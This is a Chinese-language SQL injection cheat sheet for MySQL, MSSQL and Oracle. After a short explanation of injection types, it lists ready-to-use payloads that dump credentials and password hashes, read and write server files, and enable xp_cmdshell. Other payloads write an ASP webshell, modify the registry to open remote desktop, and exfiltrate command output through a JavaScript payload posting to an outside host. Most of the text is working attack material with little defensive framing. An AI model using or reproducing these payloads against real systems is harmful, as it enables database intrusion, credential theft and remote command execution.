#SQL注入
##概念
	针对SQL注入的攻击行为可描述为通过在用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序时意料之外结果的攻击行为。其成因可以归结为以下两个原因叠加造成的：
	1. 程序编写者在处理应用程序和数据库交互时，使用字符串拼接的方式构造SQL语句
	2. 未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中

##攻击方式和危害
以MySQL为例
###攻击方式
SQL注入的攻击方式根据应用程序处理数据库返回内容的不同，可以分为可显注入、报错注入和盲注：

* 可显注入：攻击者可以直接在当前界面内容中获取想要获得的内容。
* 报错注入：数据库查询返回结果并没有在页面中显示，但是应用程序将数据库报错信息打印到了页面中，所以攻击者可以构造数据库报错语句，从报错信息中获取想要获得的内容
* 盲注：数据库查询结果无法从直观页面中获取，攻击者通过使用数据库逻辑或使数据库库执行延时等方法获取想要获得的内容。

可显注入代码示例：

	http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=0 union select 1,email_id,3 from  emails where id=3 --+
报错注入代码示例：

	http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=0 union select 1,count(*),concat((select email_id from emails where id=5),0x2a,floor(rand(0)*2))x from users group by x--+
盲注代码示例：

	http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and (select substr(email_id,1,1) from emails where id=3) > 'a' --+

##MySQL
获取环境信息

	* 获取环境信息
	SELECT @@version()
	SELECT version()
	*主机信息，IP地址
	SELECT @@hostname;
	*数据目录
	SELECT @@datadir;
	*用户名及密码
	SELECT host, user, password FROM mysql.user;
	*用户名
	SELECT user();
	SELECT system_user();
	SELECT user FROM mysql.user;
用户权限相关

	#列举用户权限
	SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;
	
	#列举用户权限
	SELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user;
	
	#列举数据库权限
	SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges;
	
	#列举 columns_priv
	SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;
列举数据库

	#当前库
	SELECT database();
	
	#所有库 (Mysql>5.0)
	SELECT schema_name FROM information_schema.schemata;
列举表名

	#常规
	SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
	
	#根据列名找表名
	SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'username';
列举字段名

	SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'

单条数据获取

	SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0;

	SELECT host,user FROM user ORDER BY host LIMIT 0,1;
显错注入

	#方式1
	and (select 1 from (select count(*),concat(SQL语句,floor(rand(0)*2))x from information_schema.tables group by x)a);
	
	#方式2
	and (select count(*) from (select 1 union select null union select !1)x group by concat(sql语句,floor(rand(0)*2)));
	
	#方式3
	and extractvalue(1, concat(0x5c, (SQL语句)));
	
	#方式4
	and 1=(updatexml(1,concat(0x5e24,(SQL语句),0x5e24),1));
延时注入

	SELECT BENCHMARK(1000000,MD5('A'));
	
	SELECT SLEEP(5); # >= 5.0.12
文件读写

	#读取文件，需要相关权限
	UNION SELECT LOAD_FILE('/etc/passwd')
	
	#写入文件，需要相关权限
	SELECT * FROM mytable INTO dumpfile '/tmp/somefile'
	
	#写入文件，需要相关权限
	SELECT * FROM mytable INTO outfile '/tmp/somefile'
判断及字符串相关

	#if判断
	SELECT if(1=1,'foo','bar'); #返回foo
	
	#case when 判断
	SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END; # 返回A
	
	#char函数，将数字转变为字符
	SELECT char(65); #返回A
	
	#ascii函数，将字符转变为数字
	SELECT ascii('A'); #返回65
	
	#concat函数，将字符连接在一起
	SELECT CONCAT('A','B'); #returns AB
	
	#字符串的16进制写法
	SELECT 0×414243; # 返回 ABC
	
	#substring/substr函数
	SELECT substr('abcd', 3, 1); #返回c
	
	#length函数
	SELECT length('abcd'); #返回4
##MSSQL
基本环境信息

	#数据库版本
	SELECT @@version
	
	#主机名，IP地址
	SELECT HOST_NAME()
	
	#当前用户
	SELECT user_name();
	SELECT system_user;
	SELECT user;
	SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID
	
	#列出所有用户
	SELECT name FROM master..syslogins
	
	#列密码 mssql 2000
	SELECT name, password FROM master..sysxlogins  --*
	SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins --*
	
	#列密码 mssql 2005
	SELECT name, password_hash FROM master.sys.sql_logins --*
	SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins --*

列举数据库

	#当前库
	SELECT DB_NAME()
	
	#列举库
	SELECT name FROM master..sysdatabases;
	SELECT DB_NAME(N); — 其中N = 0, 1, 2,

列举表名

	#列举表
	SELECT name FROM 库名..sysobjects WHERE xtype = 'U';
	
	#根据字段名列表名
	SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM 库名..sysobjects JOIN 库名..syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' AND syscolumns.name LIKE '%字段名%'
列举字段名

	#列举当前库中的表的字段
	SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '表名');
	
	#列举master库中的表的字段
	SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='表名';
单条数据获取

	#获取第 NNN 条数据
	SELECT TOP 1 name FROM (SELECT TOP NNN name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC
权限相关

	#判断当前用户权限
	SELECT is_srvrolemember('sysadmin');
	SELECT is_srvrolemember('dbcreator');
	SELECT is_srvrolemember('bulkadmin');
	SELECT is_srvrolemember('diskadmin');
	SELECT is_srvrolemember('processadmin');
	SELECT is_srvrolemember('serveradmin');
	SELECT is_srvrolemember('setupadmin');
	SELECT is_srvrolemember('securityadmin');

	#判断某指定用户的权限
	SELECT is_srvrolemember('sysadmin', 'sa');

	#判断是否是库权限
	and 1=(Select IS_MEMBER('db_owner'))

	#判断是否有库读取权限
	and 1= (Select HAS_DBACCESS('master'))

	#获取具有某个权限的用户名
	SELECT name FROM master..syslogins WHERE denylogin = 0;
	SELECT name FROM master..syslogins WHERE hasaccess = 1;
	SELECT name FROM master..syslogins WHERE isntname = 0;
	SELECT name FROM master..syslogins WHERE isntgroup = 0;
	SELECT name FROM master..syslogins WHERE sysadmin = 1;
	SELECT name FROM master..syslogins WHERE securityadmin = 1;
	SELECT name FROM master..syslogins WHERE serveradmin = 1;
	SELECT name FROM master..syslogins WHERE setupadmin = 1;
	SELECT name FROM master..syslogins WHERE processadmin = 1;
	SELECT name FROM master..syslogins WHERE diskadmin = 1;
	SELECT name FROM master..syslogins WHERE dbcreator = 1;
	SELECT name FROM master..syslogins WHERE bulkadmin = 1;

	#当前所拥有的权限
	SELECT permission_name FROM master..fn_my_permissions(null, 'DATABASE'); — current database
	SELECT permission_name FROM master..fn_my_permissions(null, 'SERVER'); — current server
	SELECT permission_name FROM master..fn_my_permissions('master..syslogins', 'OBJECT'); –permissions on a table
	SELECT permission_name FROM master..fn_my_permissions('sa', 'USER');
显错注入

	#直接与数字比较
	id=1 and @@version>0--
	id=1 and user>0--
	id=1 and db_name()>0--
	
	#将数据转换成整数致报错,可用于爆库名，表名，数据名
	id=1 and 1=convert(int,(select name from master.dbo.sysdatabases where dbid=7))--
	
	#having 1=1爆数据
	id=13 having 1=1 --
	id=13 group by 表名.字段名1,字段名2 having 1=1 --
延时注入

	#延时3秒
	IF(ascii(SUBSTRING('name',1,1))>0) waitfor delay'0:0:3'
命令执行

	#判断功能是否存在
	and select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
	and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_regread') #注册表
	and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'sp_makewebtask') #备份
	and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'sp_addextendedproc') #恢复扩展
	and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_subdirs') #读取子目录
	and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_dirtree') #列目录
	
	#恢复与删除扩展
	exec sp_addextendedproc xp_cmdshell,'xplog70.dll'
	exec sp_dropextendedproc 'xp_cmdshell'
	
	#恢复xp_cmdshell
	EXEC sp_configure 'show advanced options', 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'show advanced options', 0 --
	
	#访问COM组件
	;declare @s int;
	;exec sp_oacreat 'wscript.shell',@s
	;exec master..spoamethod @s,'run',null,'cmd.exe/c dir c:\
	
	#执行命令
	EXEC xp_cmdshell 'net user';
	
	#写注册表
	exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;--
	
	#读注册表
	create table labeng(lala nvarchar(255), id int);
	DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots','/',@result output insert into labeng(lala) values(@result); #读网站目录
	
	#写shell
	exec master.dbo.xp_cmdshell 'echo ^<%eval request("o")%^> >E:\wwwroot\1.asp'; --
	
	#停掉或激活某个服务
	exec master..xp_servicecontrol 'stop','schedule'
	exec master..xp_servicecontrol 'start','schedule'
	
	#添加、删除、设置用户为DBA的操作
	EXEC sp_addlogin 'user', 'pass';
	EXEC sp_droplogin 'user';
	EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin';
	
	#获取DB文件位置信息
	EXEC sp_helpdb master; -- master.mdf位置
文件读写

	#文件读取 (创建临时表，bulk insert读取内容到表)
	CREATE TABLE mydata (line varchar(8000));
	BULK INSERT mydata FROM 'c:\boot.ini';
	DROP TABLE mydata;
	
	#文件读取 (创建临时表，insert & xp_cmdshell读取内容)
	create table mytmp(data varchar(4000)); --
	insert mytmp exec master.dbo.xp_cmdshell 'ipconfig /all'; --
	
	#页面无回显时，读取命令执行内容 (需目标机器可连外网) (先写入JS，然后通过执行JS将命令执行内容，通过ajax发送给接收端)
	exec master.dbo.xp_cmdshell 'echo (function(){var ws=new ActiveXObject("WScript.shell"),cmd="cmd.exe /c dir c:\\";var data=ws.exec(cmd).stdout.ReadAll();var ajax=new ActiveXObject("Microsoft.xmlhttp");ajax.open("POST","http://itsokla.duapp.com/cmd.php",false);ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");ajax.send("cmd="+encodeURIComponent(cmd)+"&data="+encodeURIComponent(encodeURIComponent(data)));})() > c:\e.js' --

##Oracle
获取环境信息

	* 版本信息
	SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;
	SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;
	SELECT version FROM v$instance;

	*用户信息
	SELECT user FROM dual
	SELECT username FROM all_users ORDER BY username;
	SELECT name FROM sys.user$; — priv
	
权限相关

	SELECT * FROM session_privs; — current privs
	SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, list a user’s privs
	SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, find users with a particular priv
	SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;

列举DBA用户

	SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv, list DBAs, DBA roles

当前数据库
	
	SELECT global_name FROM global_name;
	SELECT name FROM v$database;
	SELECT instance_name FROM v$instance;
	SELECT SYS.DATABASE_NAME FROM DUAL;
列举数据库

	SELECT DISTINCT owner FROM all_tables; — list schemas (one per user)

列举表名
	
	SELECT table_name FROM all_tables;
	SELECT owner, table_name FROM all_tables;
判断及字符串相关
	
	#查找表中的列名
	SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’; — NB: table names are upper case

	#查找第几列
	SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; — gets 9th row (rows numbered from 1)
	
	#查找第几个字符
	SELECT substr(‘abcd’, 3, 1) FROM dual; — gets 3rd character, ‘c’
	
	#Bitwise AND
	SELECT bitand(6,2) FROM dual; — returns 2
	SELECT bitand(6,1) FROM dual; — returns 0
	
	#查找ASCII字符
	SELECT chr(65) FROM dual; — returns A

	#查找ASCII值
	SELECT ascii(‘A’) FROM dual; — returns 65
	
	#cast转换
	SELECT CAST(1 AS char) FROM dual;
	SELECT CAST(’1′ AS int) FROM dual;
	
	#字符链接
	SELECT ‘A’ || ‘B’ FROM dual; — returns AB

	#if判断
	BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; — doesn’t play well with SELECT statements

	#case判断
	SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — returns 1
	SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — returns 2
	
	#避免引用
	SELECT chr(65) || chr(66) FROM dual; — returns AB

	#时间延迟
	BEGIN DBMS_LOCK.SLEEP(5); END; — priv, can’t seem to embed this in a SELECT
	SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — if reverse looks are slow
	SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — if forward lookups are slow
	SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — if outbound TCP is filtered / slow
	– Also see Heavy Queries to create a time delay

	#制造DNS请求
	SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;
	SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;


	搜索型注入的语句为：
	select * from 表名 where 字段列名 like '%keywords%'
	
    select * from 表名 where 字段列名 like '%keywords   %' and 1=1 and '%'='     %'其中%' and 1=1 and '%'='为为闭合sql语句而加入的语句。其中的and 1=1处可以加入其他的语句进行判断注入了。
	
